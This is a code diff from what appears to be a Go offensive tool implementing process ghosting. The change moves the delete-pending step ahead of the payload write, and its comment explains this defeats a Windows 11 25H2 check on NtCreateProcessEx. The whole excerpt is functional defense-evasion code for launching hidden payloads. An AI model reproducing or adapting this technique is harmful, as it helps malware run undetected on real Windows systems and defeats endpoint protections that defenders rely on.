@@ -246,16 +246,21 @@ func Run(cfg Config) error {
 		}
 	}()
 
-	var written uint32
-	if err := windows.WriteFile(hFile, payload, &written, nil); err != nil {
-		return fmt.Errorf("write payload: %w", err)
-	}
-
-	// Ghosting step: unlink name from disk before creating the section.
+	// Ghosting step: per Landau's canonical sequence, mark delete-pending
+	// BEFORE writing the payload. Win11 25H2 (build 26200) appears to track
+	// the section's backing-file lifecycle and rejects NtCreateProcessEx if
+	// the file was ever fully realized on disk before the section creation;
+	// marking delete-pending on an empty file ensures the file is never
+	// "real" from the kernel's perspective at any point in its lifetime.
 	if cfg.Mode == ModeGhosting {
 		if err := ghostMarkDeletePending(hFile, cfg.Caller); err != nil {
 			return fmt.Errorf("mark delete-pending: %w", err)
 		}
+	}
+
+	var written uint32
+	if err := windows.WriteFile(hFile, payload, &written, nil); err != nil {
+		return fmt.Errorf("write payload: %w", err)
 	}
 
 	// Create image section from the file.
